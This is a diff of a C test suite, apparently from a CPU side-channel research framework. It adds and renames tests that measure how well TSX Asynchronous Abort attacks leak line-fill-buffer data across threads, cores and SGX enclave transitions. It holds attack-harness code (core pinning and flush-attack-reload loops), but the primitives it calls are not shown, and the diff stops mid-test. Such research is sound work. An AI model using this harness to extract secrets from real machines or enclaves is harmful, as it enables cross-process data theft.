@@ -106,7 +106,7 @@ static void construct_app_environment()
 
     ASSERT(signal(SIGSEGV, sigsegv_handler) != SIG_ERR);
 
-    sleep(2); // IMPORTANT! FIXME robust against signals */
+    sleep(5); // IMPORTANT! FIXME robust against signals */
 }
 
 /**
@@ -150,16 +150,27 @@ Test(_system, print_system_info, .disabled = false)
 
 #pragma region taa
 
-TestSuite(taa, .init = construct_app_environment, .fini = desctruct_app_environment, .disabled = false);
+TestSuite(taa, .init = construct_app_environment, .fini = desctruct_app_environment);
+
+#pragma region same_thread_taa_nosgx_is_effective
 
 /**
- * @brief Test if taa_same_thread is effective with a successful rate above 75% for at least 75% offset.
+ * @brief Test if same_thread_taa_nosgx is effective with a successful rate above 75% for at least 75% offset.
  * 
  * @return int 0 if passed, -1 if failed.
  */
-static int test_core_taa_same_thread_is_effective()
+static int test_core_same_thread_taa_nosgx_is_effective()
 {
     int i, offset, allowance;
+    int core;
+    cpu_set_t cpuset;
+
+    core = 1;
+
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+
+    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
 
     allowance = 16;
     for (offset = 0; offset < 64; offset++)
@@ -181,7 +192,7 @@ static int test_core_taa_same_thread_is_effective()
     return 0;
 }
 
-Test(taa, taa_same_thread_is_effective, .disabled = false)
+Test(taa, same_thread_taa_nosgx_is_effective, .disabled = false)
 {
     app_attack_spec.major = ATTACK_MAJOR_TAA;
     app_attack_spec.minor = ATTACK_MINOR_STABLE;
@@ -195,31 +206,182 @@ Test(taa, taa_same_thread_is_effective, .disabled = false)
     assign_enclyser_buffer(&app_attaking_buffer);
 
     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
-    cr_expect(test_core_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+    cr_expect(test_core_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
-    cr_expect(test_core_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+    cr_expect(test_core_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
-    cr_expect(test_core_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+    cr_expect(test_core_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
-    cr_expect(test_core_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+    cr_expect(test_core_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
-    cr_expect(test_core_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+    cr_expect(test_core_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
-    cr_expect(test_core_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+    cr_expect(test_core_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
 }
 
+#pragma endregion
+
+#pragma region same_thread_taa_eexit_is_effective
+
 /**
- * @brief 
+ * @brief Test if same_thread_taa_eexit is effective with a successful rate above 75% for at least 75% offset.
+ * 
+ * @return int 0 if passed, -1 if failed.
+ */
+static int test_core_same_thread_taa_eexit_is_effective()
+{
+    int i, offset, allowance;
+    int core;
+    cpu_set_t cpuset;
+
+    core = 1;
+
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+
+    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
+
+    allowance = 16;
+    for (offset = 0; offset < 64; offset++)
+    {
+        app_attack_spec.offset = offset;
+        for (i = 0; i < REPETITION_TIME; i++)
+        {
+            flush_enclyser_buffer(&app_encoding_buffer);
+            ecall_grooming(global_eid, app_filling_sequence, &app_filling_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
+            attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
+            reload(&app_encoding_buffer, &app_printing_buffer);
+        }
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 75 || allowance--))
+        {
+            return -1;
+        }
+        reset(&app_printing_buffer);
+    }
+    return 0;
+}
+
+Test(taa, same_thread_taa_eexit_is_effective, .disabled = false)
+{
+    app_attack_spec.major = ATTACK_MAJOR_TAA;
+    app_attack_spec.minor = ATTACK_MINOR_STABLE;
+
+    app_filling_buffer.value = 0x41;
+    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
+    assign_enclyser_buffer(&app_filling_buffer);
+
+    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
+    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
+    assign_enclyser_buffer(&app_attaking_buffer);
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
+    cr_expect(test_core_same_thread_taa_eexit_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
+    cr_expect(test_core_same_thread_taa_eexit_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
+    cr_expect(test_core_same_thread_taa_eexit_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
+    cr_expect(test_core_same_thread_taa_eexit_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
+    cr_expect(test_core_same_thread_taa_eexit_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
+    cr_expect(test_core_same_thread_taa_eexit_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+}
+
+#pragma endregion
+
+#pragma region same_thread_taa_aex_is_effective
+
+/**
+ * @brief Test if same_thread_taa_aex is effective with a successful rate above 75% for at least 75% offset.
+ * 
+ * @return int 0 if passed, -1 if failed.
+ */
+static int test_core_same_thread_taa_aex_is_effective()
+{
+    int i, offset, allowance;
+    int core;
+    cpu_set_t cpuset;
+
+    core = 1;
+
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+
+    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
+
+    allowance = 16;
+    for (offset = 0; offset < 64; offset++)
+    {
+        app_attack_spec.offset = offset;
+        for (i = 0; i < REPETITION_TIME; i++)
+        {
+            ASSERT(!mprotect(app_faulting_buffer.buffer, app_faulting_buffer.size, PROT_NONE));
+            flush_enclyser_buffer(&app_encoding_buffer);
+            ecall_grooming(global_eid, app_filling_sequence, &app_filling_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
+        }
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 75 || allowance--))
+        {
+            return -1;
+        }
+        reset(&app_printing_buffer);
+    }
+    return 0;
+}
+
+Test(taa, same_thread_taa_aex_is_effective, .disabled = false)
+{
+    app_attack_spec.major = ATTACK_MAJOR_TAA;
+    app_attack_spec.minor = ATTACK_MINOR_STABLE;
+
+    app_filling_buffer.value = 0x81;
+    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
+    assign_enclyser_buffer(&app_filling_buffer);
+
+    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
+    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
+    assign_enclyser_buffer(&app_attaking_buffer);
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
+    cr_expect(test_core_same_thread_taa_aex_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
+    cr_expect(test_core_same_thread_taa_aex_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
+    cr_expect(test_core_same_thread_taa_aex_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
+    cr_expect(test_core_same_thread_taa_aex_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
+    cr_expect(test_core_same_thread_taa_aex_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
+    cr_expect(test_core_same_thread_taa_aex_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+}
+
+#pragma endregion
+
+#pragma region cross_thread_taa_nosgx_is_effective
+
+/**
+ * @brief The victim function run by pthread
  * 
  * @param arg data passed to the thread function
  * @return void* always return NULL
  */
-static void *test_core_taa_cross_thread_is_effective_victim_thread(void *arg)
+static void *test_core_cross_thread_taa_nosgx_is_effective_victim_thread(void *arg)
 {
     int i;
 
@@ -232,12 +394,12 @@ static void *test_core_taa_cross_thread_is_effective_victim_thread(void *arg)
 }
 
 /**
- * @brief 
+ * @brief The adversary function run by pthread
  * 
  * @param arg data passed to the thread function
  * @return void* always return NULL
  */
-static void *test_core_taa_cross_thread_is_effective_adversary_thread(void *arg)
+static void *test_core_cross_thread_taa_nosgx_is_effective_adversary_thread(void *arg)
 {
     int i;
 
@@ -252,18 +414,18 @@ static void *test_core_taa_cross_thread_is_effective_adversary_thread(void *arg)
 }
 
 /**
- * @brief Test if taa_cross_thread is effective with a successful rate above or equal to 2% for at least 75% offset.
+ * @brief Test if cross_thread_taa_nosgx is effective with a successful rate above or equal to 2% for at least 75% offset.
  * 
  * @return int 0 if passed, -1 if failed.
  */
-static int test_core_taa_cross_thread_is_effective()
+static int test_core_cross_thread_taa_nosgx_is_effective()
 {
     int offset, allowance;
     int victim_core, adversary_core;
     pthread_t victim_thread, adversary_thread;
     cpu_set_t victim_cpuset, adversary_cpuset;
 
-    victim_core = 0;
+    victim_core = 1;
     adversary_core = victim_core + app_sysinfo.nr_cores;
 
     CPU_ZERO(&victim_cpuset);
@@ -276,8 +438,8 @@ static int test_core_taa_cross_thread_is_effective()
     {
         app_attack_spec.offset = offset;
 
-        ASSERT(!pthread_create(&victim_thread, NULL, test_core_taa_cross_thread_is_effective_victim_thread, NULL));
-        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_taa_cross_thread_is_effective_adversary_thread, NULL));
+        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_taa_nosgx_is_effective_victim_thread, NULL));
+        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_taa_nosgx_is_effective_adversary_thread, NULL));
 
         ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
         ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));
@@ -294,10 +456,9 @@ static int test_core_taa_cross_thread_is_effective()
         reset(&app_printing_buffer);
     }
     return 0;
-    
 }
 
-Test(taa, taa_cross_thread_is_effective, .disabled = false)
+Test(taa, cross_thread_taa_nosgx_is_effective, .disabled = false)
 {
     app_attack_spec.major = ATTACK_MAJOR_TAA;
     app_attack_spec.minor = ATTACK_MINOR_STABLE;
@@ -311,59 +472,99 @@ Test(taa, taa_cross_thread_is_effective, .disabled = false)
     assign_enclyser_buffer(&app_attaking_buffer);
 
     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
-    cr_expect(test_core_taa_cross_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+    cr_expect(test_core_cross_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
-    cr_expect(test_core_taa_cross_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+    cr_expect(test_core_cross_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
-    cr_expect(test_core_taa_cross_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+    cr_expect(test_core_cross_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
-    cr_expect(test_core_taa_cross_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+    cr_expect(test_core_cross_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
-    cr_expect(test_core_taa_cross_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+    cr_expect(test_core_cross_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
-    cr_expect(test_core_taa_cross_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+    cr_expect(test_core_cross_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
 }
 
-// /**
-//  * @brief Test if taa_cross_core is effective with a successful rate above 75% for at least 75% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_taa_cross_core_is_effective()
-// {
-// }
+#pragma endregion
 
-// Test(taa, taa_cross_core_is_effective, .disabled = false)
-// {
-// }
+#pragma region cross_thread_taa_ecall_is_effective
 
 /**
- * @brief Test if taa_eexit_same_thread is effective with a successful rate above 75% for at least 75% offset.
+ * @brief The victim function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_thread_taa_ecall_is_effective_victim_thread(void *arg)
+{
+    ecall_rep_fill_lfb(global_eid, app_filling_sequence, &app_filling_buffer);
+
+    return NULL;
+}
+
+/**
+ * @brief The adversary function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_thread_taa_ecall_is_effective_adversary_thread(void *arg)
+{
+    int i;
+
+    for (i = 0; i < REPETITION_TIME; i++)
+    {
+        flush_enclyser_buffer(&app_encoding_buffer);
+        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
+        reload(&app_encoding_buffer, &app_printing_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief Test if cross_thread_taa_ecall is effective with a successful rate above or equal to 2% for at least 75% offset.
  * 
  * @return int 0 if passed, -1 if failed.
  */
-static int test_core_taa_eexit_same_thread_is_effective()
+static int test_core_cross_thread_taa_ecall_is_effective()
 {
-    int i, offset, allowance;
+    int offset, allowance;
+    int victim_core, adversary_core;
+    pthread_t victim_thread, adversary_thread;
+    cpu_set_t victim_cpuset, adversary_cpuset;
+
+    victim_core = 1;
+    adversary_core = victim_core + app_sysinfo.nr_cores;
+
+    CPU_ZERO(&victim_cpuset);
+    CPU_ZERO(&adversary_cpuset);
+    CPU_SET(victim_core, &victim_cpuset);
+    CPU_SET(adversary_core, &adversary_cpuset);
 
     allowance = 16;
     for (offset = 0; offset < 64; offset++)
     {
         app_attack_spec.offset = offset;
-        for (i = 0; i < REPETITION_TIME; i++)
+
+        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_taa_ecall_is_effective_victim_thread, NULL));
+        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_taa_ecall_is_effective_adversary_thread, NULL));
+
+        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
+        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));
+
+        pthread_join(adversary_thread, NULL);
+        pthread_join(victim_thread, NULL);
+
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 2 || allowance--))
         {
-            flush_enclyser_buffer(&app_encoding_buffer);
-            ecall_grooming(global_eid, app_filling_sequence, &app_filling_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
-            attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
-            reload(&app_encoding_buffer, &app_printing_buffer);
-        }
-        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 75 || allowance--))
-        {
+            // INFO("offset: 0x%x", offset);
+            // print(&app_printing_buffer, 0);
             return -1;
         }
         reset(&app_printing_buffer);
@@ -371,12 +572,12 @@ static int test_core_taa_eexit_same_thread_is_effective()
     return 0;
 }
 
-Test(taa, taa_eexit_same_thread_is_effective, .disabled = false)
+Test(taa, cross_thread_taa_ecall_is_effective, .disabled = false)
 {
     app_attack_spec.major = ATTACK_MAJOR_TAA;
     app_attack_spec.minor = ATTACK_MINOR_STABLE;
 
-    app_filling_buffer.value = 0x41;
+    app_filling_buffer.value = 0x1;
     app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
     assign_enclyser_buffer(&app_filling_buffer);
 
@@ -385,71 +586,104 @@ Test(taa, taa_eexit_same_thread_is_effective, .disabled = false)
     assign_enclyser_buffer(&app_attaking_buffer);
 
     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
-    cr_expect(test_core_taa_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+    cr_expect(test_core_cross_thread_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
-    cr_expect(test_core_taa_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+    cr_expect(test_core_cross_thread_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
-    cr_expect(test_core_taa_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+    cr_expect(test_core_cross_thread_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
-    cr_expect(test_core_taa_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+    cr_expect(test_core_cross_thread_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
-    cr_expect(test_core_taa_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+    cr_expect(test_core_cross_thread_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
-    cr_expect(test_core_taa_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+    cr_expect(test_core_cross_thread_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
 }
 
-// /**
-//  * @brief Test if taa_eexit_cross_thread is effective with a successful rate above 75% for at least 75% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_taa_eexit_cross_thread_is_effective()
-// {
-// }
+#pragma endregion
 
-// Test(taa, taa_eexit_cross_thread_is_effective, .disabled = false)
-// {
-// }
-
-// /**
-//  * @brief Test if taa_eexit_cross_core is effective with a successful rate above 75% for at least 75% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_taa_eexit_cross_core_is_effective()
-// {
-// }
-
-// Test(taa, taa_eexit_cross_core_is_effective, .disabled = false)
-// {
-// }
+#pragma region cross_core_taa_nosgx_is_effective
 
 /**
- * @brief Test if taa_aex_same_thread is effective with a successful rate above 75% for at least 75% offset.
+ * @brief The victim function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_core_taa_nosgx_is_effective_victim_thread(void *arg)
+{
+    int i;
+
+    for (i = 0; i < REPETITION_TIME * 100; i++)
+    {
+        fill_lfb(app_filling_sequence, &app_filling_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief The adversary function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_core_taa_nosgx_is_effective_adversary_thread(void *arg)
+{
+    int i;
+
+    for (i = 0; i < REPETITION_TIME; i++)
+    {
+        flush_enclyser_buffer(&app_encoding_buffer);
+        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
+        reload(&app_encoding_buffer, &app_printing_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief Test if cross_core_taa_nosgx is effective with a successful rate above or equal to 2% for at least 75% offset.
  * 
  * @return int 0 if passed, -1 if failed.
  */
-static int test_core_taa_aex_same_thread_is_effective()
+static int test_core_cross_core_taa_nosgx_is_effective()
 {
-    int i, offset, allowance;
+    int offset, allowance;
+    int victim_core, adversary_core;
+    pthread_t victim_thread, adversary_thread;
+    cpu_set_t victim_cpuset, adversary_cpuset;
+
+    victim_core = 1;
+    adversary_core = victim_core + app_sysinfo.nr_cores - 1;
+
+    CPU_ZERO(&victim_cpuset);
+    CPU_ZERO(&adversary_cpuset);
+    CPU_SET(victim_core, &victim_cpuset);
+    CPU_SET(adversary_core, &adversary_cpuset);
 
     allowance = 16;
     for (offset = 0; offset < 64; offset++)
     {
         app_attack_spec.offset = offset;
-        for (i = 0; i < REPETITION_TIME; i++)
+
+        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_taa_nosgx_is_effective_victim_thread, NULL));
+        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_taa_nosgx_is_effective_adversary_thread, NULL));
+
+        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
+        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));
+
+        pthread_join(adversary_thread, NULL);
+        pthread_join(victim_thread, NULL);
+
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 2 || allowance--))
         {
-            ASSERT(!mprotect(app_faulting_buffer.buffer, app_faulting_buffer.size, PROT_NONE));
-            flush_enclyser_buffer(&app_encoding_buffer);
-            ecall_grooming(global_eid, app_filling_sequence, &app_filling_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
-        }
-        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 75 || allowance--))
-        {
+            // INFO("offset: 0x%x", offset);
+            // print(&app_printing_buffer, 0);
             return -1;
         }
         reset(&app_printing_buffer);
@@ -457,12 +691,12 @@ static int test_core_taa_aex_same_thread_is_effective()
     return 0;
 }
 
-Test(taa, taa_aex_same_thread_is_effective, .disabled = false)
+Test(taa, cross_core_taa_nosgx_is_effective, .disabled = false)
 {
     app_attack_spec.major = ATTACK_MAJOR_TAA;
     app_attack_spec.minor = ATTACK_MINOR_STABLE;
 
-    app_filling_buffer.value = 0x81;
+    app_filling_buffer.value = 0x1;
     app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
     assign_enclyser_buffer(&app_filling_buffer);
 
@@ -471,78 +705,181 @@ Test(taa, taa_aex_same_thread_is_effective, .disabled = false)
     assign_enclyser_buffer(&app_attaking_buffer);
 
     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
-    cr_expect(test_core_taa_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+    cr_expect(test_core_cross_core_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
-    cr_expect(test_core_taa_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+    cr_expect(test_core_cross_core_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
-    cr_expect(test_core_taa_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+    cr_expect(test_core_cross_core_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
-    cr_expect(test_core_taa_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+    cr_expect(test_core_cross_core_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
-    cr_expect(test_core_taa_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+    cr_expect(test_core_cross_core_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
-    cr_expect(test_core_taa_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+    cr_expect(test_core_cross_core_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
 }
 
-// /**
-//  * @brief Test if taa_aex_cross_thread is effective with a successful rate above 75% for at least 75% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_taa_aex_cross_thread_is_effective()
-// {
-// }
+#pragma endregion
 
-// Test(taa, taa_aex_cross_thread_is_effective, .disabled = false)
-// {
-// }
+#pragma region cross_core_taa_ecall_is_effective
 
-// /**
-//  * @brief Test if taa_aex_cross_core is effective with a successful rate above 75% for at least 75% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_taa_aex_cross_core_is_effective()
-// {
-// }
+/**
+ * @brief The victim function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_core_taa_ecall_is_effective_victim_thread(void *arg)
+{
+    ecall_rep_fill_lfb(global_eid, app_filling_sequence, &app_filling_buffer);
 
-// Test(taa, taa_aex_cross_core_is_effective, .disabled = false)
-// {
-// }
+    return NULL;
+}
+
+/**
+ * @brief The adversary function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_core_taa_ecall_is_effective_adversary_thread(void *arg)
+{
+    int i;
+
+    for (i = 0; i < REPETITION_TIME; i++)
+    {
+        flush_enclyser_buffer(&app_encoding_buffer);
+        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
+        reload(&app_encoding_buffer, &app_printing_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief Test if cross_core_taa_ecall is effective with a successful rate above or equal to 2% for at least 75% offset.
+ * 
+ * @return int 0 if passed, -1 if failed.
+ */
+static int test_core_cross_core_taa_ecall_is_effective()
+{
+    int offset, allowance;
+    int victim_core, adversary_core;
+    pthread_t victim_thread, adversary_thread;
+    cpu_set_t victim_cpuset, adversary_cpuset;
+
+    victim_core = 1;
+    adversary_core = victim_core + app_sysinfo.nr_cores - 1;
+
+    CPU_ZERO(&victim_cpuset);
+    CPU_ZERO(&adversary_cpuset);
+    CPU_SET(victim_core, &victim_cpuset);
+    CPU_SET(adversary_core, &adversary_cpuset);
+
+    allowance = 16;
+    for (offset = 0; offset < 64; offset++)
+    {
+        app_attack_spec.offset = offset;
+
+        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_taa_ecall_is_effective_victim_thread, NULL));
+        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_taa_ecall_is_effective_adversary_thread, NULL));
+
+        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
+        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));
+
+        pthread_join(adversary_thread, NULL);
+        pthread_join(victim_thread, NULL);
+
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 2 || allowance--))
+        {
+            // INFO("offset: 0x%x", offset);
+            // print(&app_printing_buffer, 0);
+            return -1;
+        }
+        reset(&app_printing_buffer);
+    }
+    return 0;
+}
+
+Test(taa, cross_core_taa_ecall_is_effective, .disabled = false)
+{
+    app_attack_spec.major = ATTACK_MAJOR_TAA;
+    app_attack_spec.minor = ATTACK_MINOR_STABLE;
+
+    app_filling_buffer.value = 0x1;
+    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
+    assign_enclyser_buffer(&app_filling_buffer);
+
+    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
+    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
+    assign_enclyser_buffer(&app_attaking_buffer);
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
+    cr_expect(test_core_cross_core_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
+    cr_expect(test_core_cross_core_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
+    cr_expect(test_core_cross_core_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
+    cr_expect(test_core_cross_core_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
+    cr_expect(test_core_cross_core_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+
